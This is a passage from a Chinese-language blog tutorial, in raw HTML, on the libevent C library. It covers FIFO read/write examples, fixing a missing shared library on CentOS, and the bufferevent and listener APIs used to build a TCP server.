class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short what,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//读管道</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len = read(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read event: %s \n"</span>,what &amp; EV_READ ?<span class="string">"Yes"</span>:<span class="string">"No"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"data len = %d,buf = %s\n"</span>,len,buf);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读管道</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">unlink(<span class="string">"myfifo"</span>);</span><br><span class="line">mkfifo(<span class="string">"myfifo"</span>,<span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"myfifo"</span>,O_RDONLY | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个event_base</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建事件</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">ev</span> = <span class="title">NULL</span>;</span></span><br><span class="line">ev = event_new(base,fd,EV_READ|EV_PERSIST,read_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加事件</span></span><br><span class="line">event_add(ev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//事件循环</span></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line">event_free(ev);</span><br><span class="line">event_base_free(base);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>write_fifo.c</code>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short what,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//写管道</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buf,<span class="string">"hello,world-%d\n"</span>,num++);</span><br><span class="line">write(fd,buf,<span class="built_in">strlen</span>(buf)+<span class="number">1</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写管道</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"myfifo"</span>,O_WRONLY | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个event_base</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建事件</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">ev</span> = <span class="title">NULL</span>;</span></span><br><span class="line">ev = event_new(base,fd,EV_WRITE|EV_PERSIST,write_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加事件</span></span><br><span class="line">event_add(ev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//事件循环</span></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line">event_free(ev);</span><br><span class="line">event_base_free(base);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在mac上编译执行之后发现并没有打印结果，<code>gdb</code>调试一下，发现卡在了<code>dispatch</code>这里，<code>dispatch</code>函数就相当于是<code>while+select/poll/epoll</code>这种形式，对于<code>libevent</code>库默认使用的是<code>epoll</code>，然而<code>epoll</code>对于mac是不支持的。</p><p><img src="/2021/11/19/浅学libevent/4.png" alt="4"></p><p>于是我把代码放到了<code>centos</code>服务器上，<code>./read_fifo</code>运行报错如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error <span class="keyword">while</span> loading shared libraries: libevent<span class="number">-2.1</span>.so<span class="number">.6</span>: cannot open shared object file: No such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure><p>ldd查看依赖发现没有找到<code>libevent-2.1.so.6</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elssm@VM<span class="number">-20</span><span class="number">-13</span>-centos ~/event&gt; ldd read_fifo</span><br><span class="line">linux-vdso.so<span class="number">.1</span> =&gt;  (<span class="number">0x00007ffcbc5f7000</span>)</span><br><span class="line">/$LIB/libonion.so =&gt; /lib64/libonion.so (<span class="number">0x00007fda57d92000</span>)</span><br><span class="line">libevent<span class="number">-2.1</span>.so<span class="number">.6</span> =&gt; <span class="keyword">not</span> found</span><br><span class="line">libc.so<span class="number">.6</span> =&gt; /lib64/libc.so<span class="number">.6</span> (<span class="number">0x00007fda57657000</span>)</span><br><span class="line">libdl.so<span class="number">.2</span> =&gt; /lib64/libdl.so<span class="number">.2</span> (<span class="number">0x00007fda57453000</span>)</span><br><span class="line">libcrypto.so<span class="number">.10</span> =&gt; /lib64/libcrypto.so<span class="number">.10</span> (<span class="number">0x00007fda56ff0000</span>)</span><br><span class="line">libpthread.so<span class="number">.0</span> =&gt; /lib64/libpthread.so<span class="number">.0</span> (<span class="number">0x00007fda56dd4000</span>)</span><br><span class="line">/lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fda57c79000</span>)</span><br><span class="line">libz.so<span class="number">.1</span> =&gt; /lib64/libz.so<span class="number">.1</span> (<span class="number">0x00007fda56bbe000</span>)</span><br></pre></td></tr></table></figure><p>创建软链接如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/lib/libevent<span class="number">-2.1</span>.so<span class="number">.6</span> /usr/lib64/libevent<span class="number">-2.1</span>.so<span class="number">.6</span></span><br></pre></td></tr></table></figure><p>再次查看依赖</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elssm@VM<span class="number">-20</span><span class="number">-13</span>-centos ~/event&gt; ldd read_fifo</span><br><span class="line">linux-vdso.so<span class="number">.1</span> =&gt;  (<span class="number">0x00007ffcbc5f7000</span>)</span><br><span class="line">/$LIB/libonion.so =&gt; /lib64/libonion.so (<span class="number">0x00007fda57d92000</span>)</span><br><span class="line">libevent<span class="number">-2.1</span>.so<span class="number">.6</span> =&gt; /lib64/libevent<span class="number">-2.1</span>.so<span class="number">.6</span> (<span class="number">0x00007fda57a25000</span>)</span><br><span class="line">libc.so<span class="number">.6</span> =&gt; /lib64/libc.so<span class="number">.6</span> (<span class="number">0x00007fda57657000</span>)</span><br><span class="line">libdl.so<span class="number">.2</span> =&gt; /lib64/libdl.so<span class="number">.2</span> (<span class="number">0x00007fda57453000</span>)</span><br><span class="line">libcrypto.so<span class="number">.10</span> =&gt; /lib64/libcrypto.so<span class="number">.10</span> (<span class="number">0x00007fda56ff0000</span>)</span><br><span class="line">libpthread.so<span class="number">.0</span> =&gt; /lib64/libpthread.so<span class="number">.0</span> (<span class="number">0x00007fda56dd4000</span>)</span><br><span class="line">/lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fda57c79000</span>)</span><br><span class="line">libz.so<span class="number">.1</span> =&gt; /lib64/libz.so<span class="number">.1</span> (<span class="number">0x00007fda56bbe000</span>)</span><br></pre></td></tr></table></figure><p>之后分别执行<code>./read_fifo</code>和<code>./write_fifo</code>。发现成功读写</p><p><img src="/2021/11/19/浅学libevent/5.png" alt="5"></p><h4 id="事件的未决和非未决"><a href="#事件的未决和非未决" class="headerlink" title="事件的未决和非未决"></a>事件的未决和非未决</h4><ul><li>未决：有资格被处理，但尚未被处理</li><li>非未决：没有资格被处理</li></ul><p>事件的未决和非未决状态转换图如下所示</p><p><img src="/2021/11/19/浅学libevent/6.png" alt="6"></p><h4 id="bufferevent"><a href="#bufferevent" class="headerlink" title="bufferevent"></a>bufferevent</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br></pre></td></tr></table></figure><p><code>bufferevent</code>有两个缓冲区，也是队列实现，先进先出</p><p>读：有数据——&gt;读回调函数被调用——-&gt;使用<code>bufferevent_read()</code>——&gt;读数据</p><p>写：使用<code>bufferevent_write()</code>——-&gt;向写缓冲中写数据——-&gt;该缓冲区有数据自动写出——&gt;写完，回调函数被调用</p><h4 id="bufferevent创建和释放"><a href="#bufferevent创建和释放" class="headerlink" title="bufferevent创建和释放"></a>bufferevent创建和释放</h4><p>创建<code>bufferevent</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">ev</span></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">bufferevent</span> *<span class="title">bufferevent_socket_new</span>(<span class="title">struct</span> <span class="title">event_base</span> *<span class="title">base</span>,<span class="title">evutil_socket_tfd</span>,<span class="title">enum</span> <span class="title">bufferevent_options</span> <span class="title">options</span>);</span></span><br><span class="line"></span><br><span class="line">base: event_base_new函数的返回值</span><br><span class="line">fd: 跟bufferevent绑定的文件描述符类比event_new()</span><br><span class="line">options: BEV_OPT_CLOSE_ON_FREE只用这一个即可</span><br><span class="line">   </span><br><span class="line">返回: 成功创建的bufferevent事件对象</span><br></pre></td></tr></table></figure><p>释放<code>bufferevent</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_free</span><span class="params">(struct bufferevent *bev)</span></span></span><br></pre></td></tr></table></figure><h4 id="给读写缓冲区设置回调"><a href="#给读写缓冲区设置回调" class="headerlink" title="给读写缓冲区设置回调"></a>给读写缓冲区设置回调</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_setcb</span><span class="params">(struct bufferevent *bufev,bufferevent_data_cb readcb,bufferevent_data_cb writecb,bufferevent_event_cb eventcb,<span class="keyword">void</span> *cbarg)</span></span>;</span><br><span class="line"></span><br><span class="line">bufev: bufferevent_socket_new()函数的返回值</span><br><span class="line">readcb:读缓冲对应的回调，自己封装，在其内部读数据</span><br><span class="line">  writecb:设置bufferevent写缓冲 不用，传<span class="literal">NULL</span></span><br><span class="line">  eventcb: 设置事件回调。可传<span class="literal">NULL</span></span><br><span class="line">  cbarg: 回调函数用的参数</span><br></pre></td></tr></table></figure><h5 id="readcb对应的回调函数"><a href="#readcb对应的回调函数" class="headerlink" title="readcb对应的回调函数"></a>readcb对应的回调函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*bufferevent_data_cb)</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *ctx)</span></span>;</span><br></pre></td></tr></table></figure><p>例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line">  ....</span><br><span class="line">  bufferevent_read();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">bufferevent_read</span><span class="params">(struct bufferevent *bufev,<span class="keyword">void</span> *data,<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="comment">//通常用在readcb中，代替read()</span></span><br></pre></td></tr></table></figure><h5 id="writecb对应的回调函数"><a href="#writecb对应的回调函数" class="headerlink" title="writecb对应的回调函数"></a>writecb对应的回调函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line">  ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bufferevent_write</span><span class="params">(struct bufferevent *bufev,<span class="keyword">const</span> <span class="keyword">void</span> *data,<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="comment">//常用在bufferevent_read之后，代替write()</span></span><br></pre></td></tr></table></figure><h5 id="eventcb对应的回调函数"><a href="#eventcb对应的回调函数" class="headerlink" title="eventcb对应的回调函数"></a>eventcb对应的回调函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*bufferevent_event_cb)</span><span class="params">(struct bufferevent *bev,short events,<span class="keyword">void</span> *ctx)</span></span>;</span><br><span class="line"></span><br><span class="line">events: 不同标志位，代表不同的事件</span><br><span class="line">  BEV_EVENT_READING: 读取操作时发生某事件，具体是哪种事件，看其他标志</span><br><span class="line">  BEV_EVENT_WRITING: 写入操作时发生某事件，具体是哪种事件，看其他标志</span><br><span class="line">  BEV_EVENT_ERROR: 操作时发生错误</span><br><span class="line">  BEV_EVENT_TIMEOUT: 发生超时</span><br><span class="line">  BEV_EVENT_EOF: 遇到文件结束指示</span><br><span class="line">  BEV_EVENT_CONNECTED: 请求的连接过程已经完成，实现客户端时可用</span><br></pre></td></tr></table></figure><h4 id="禁用和启用缓冲区"><a href="#禁用和启用缓冲区" class="headerlink" title="禁用和启用缓冲区"></a>禁用和启用缓冲区</h4><p>默认：新建的<code>bufferevent</code>写缓冲时<code>enable</code>的，而读缓冲是<code>disable</code>的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_enable</span><span class="params">(struct bufferevent *bufev,short events)</span></span>;</span><br><span class="line"><span class="comment">//通常用来启用bufferevent的read缓冲</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_disable</span><span class="params">(struct bufferevent *bufev,short events)</span></span>; <span class="comment">//禁用</span></span><br><span class="line"></span><br><span class="line">events: EV_READ、EV_WRITE、EV_READ｜EV_WRITE</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">short <span class="title">bufferevent_get_enabled</span><span class="params">(struct bufferevent *bufev)</span></span>;</span><br><span class="line"><span class="comment">//获取缓冲区的禁用状态，需要借助&amp;来得到</span></span><br></pre></td></tr></table></figure><h4 id="客户端连接服务器"><a href="#客户端连接服务器" class="headerlink" title="客户端连接服务器"></a>客户端连接服务器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bufferevent_socket_connect</span><span class="params">(struct bufferevent *bev,struct sockaddr *address,<span class="keyword">int</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">bev: bufferevent事件对象(封装了fd)</span><br><span class="line">  address: 地址结构</span><br><span class="line">  addrlen: 地址长度</span><br></pre></td></tr></table></figure><h4 id="服务器创建监听器"><a href="#服务器创建监听器" class="headerlink" title="服务器创建监听器"></a>服务器创建监听器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="function">struct evconnlistener * <span class="title">evconnlistener_new</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">struct event_base *base,</span></span></span><br><span class="line"><span class="function"><span class="params">  evconnlistener_cb cb,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> backlog,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">evutil_socket_t</span> fd</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evconnlistener</span> *<span class="title">listener</span></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">evconnlistener</span> *<span class="title">evconnlistener_new_bind</span>(</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">event_base</span> *<span class="title">base</span>,</span></span><br><span class="line"><span class="class">  <span class="title">evconnlistener_cb</span> <span class="title">cb</span>,</span></span><br><span class="line"><span class="class">  <span class="title">void</span> *<span class="title">ptr</span>,</span></span><br><span class="line"><span class="class">  <span class="title">unsigned</span> <span class="title">flags</span>,</span></span><br><span class="line"><span class="class">  <span class="title">int</span> <span class="title">backlog</span>,</span></span><br><span class="line"><span class="class">  <span class="title">const</span> <span class="title">struct</span> <span class="title">sockaddr</span> *<span class="title">sa</span>,</span></span><br><span class="line"><span class="class">  <span class="title">int</span> <span class="title">socklen</span></span></span><br><span class="line"><span class="class">);</span></span><br><span class="line"></span><br><span class="line">cb: 监听回调函数，接受连接之后用户要做的操作</span><br><span class="line">  ptr: 回调函数的参数</span><br><span class="line">flags: “可识别的标志”</span><br><span class="line">    LEV_OPT_CLOSE_ON_FREE: 释放bufferevent时关闭底层传输端口，这将关闭底层套接字，释放底层bufferevent</span><br><span class="line">    LEV_OPT_REUSEABLE: 端口复用，可以<span class="string">"|"</span></span><br><span class="line">  backlog: listen()函数的第二个参数，传<span class="number">-1</span>表示使用默认最大值</span><br><span class="line">  sa: 服务器自己的地址结构体，IP+Port</span><br><span class="line">  socklen: 服务器自己的地址结构体大小</span><br><span class="line"></span><br><span class="line">返回值: 成功创建的监听器</span><br></pre></td></tr></table></figure><h5 id="回调函数类型"><a href="#回调函数类型" class="headerlink" title="回调函数类型"></a>回调函数类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*evconnlistener_cb)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">struct evconnlistener *listener,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">evutil_socket_t</span> sock,</span></span></span><br><span class="line"><span class="function"><span class="params">  struct sockaddr *addr,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> len,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">void</span> *ptr</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line">listener: evconnlistener_new_bind函数的返回值</span><br><span class="line">sock: 用于通信的文件描述符</span><br><span class="line">addr: 客户端的IP+端口</span><br><span class="line">len: addr的len</span><br><span class="line">ptr: 外部ptr传递进来的值</span><br></pre></td></tr></table></figure><h4 id="释放监听服务器"><a href="#释放监听服务器" class="headerlink" title="释放监听服务器"></a>释放监听服务器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evconnlistener_free(listener);</span><br></pre></td></tr></table></figure><h4 id="服务端bufferevent创建TCP连接流程"><a href="#服务端bufferevent创建TCP连接流程" class="headerlink" title="服务端bufferevent创建TCP连接流程"></a>服务端bufferevent创建TCP连接流程</h4><ul><li>创建<code>event_base</code></li><li>创建服务器连接监听器<code>evconnlistener_new_bind()</code></li><li>在<code>evconnlistener_new_bind()</code>的回调函数中，处理接受连接后的操作</li><li>回调函数被调用，说明有一个新的客户端连接，会得到一个新的fd，用于和客户端进行通信</li><li>创建<code>bufferevent</code>事件对象，<code>bufferevent_socket_new()</code>，将fd封装到这个事件对象中</li><li>使用<code>bufferevent_setcb()</code>函数给<code>bufferevent</code>的<code>read、write、event</code>设置回调函数</li><li>设置读缓冲、写缓冲的使能状态 <code>enable、disable</code></li><li>接受、发送数据<code>bufferevent_read()/bufferevent_write()</code></li><li>启动循环<code>event_base_dispatch()</code></li><li>释放资源</li></ul><h4 id="服务端bufferevent实现"><a href="#服务端bufferevent实现" class="headerlink" title="服务端bufferevent实现"></a>服务端bufferevent实现</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 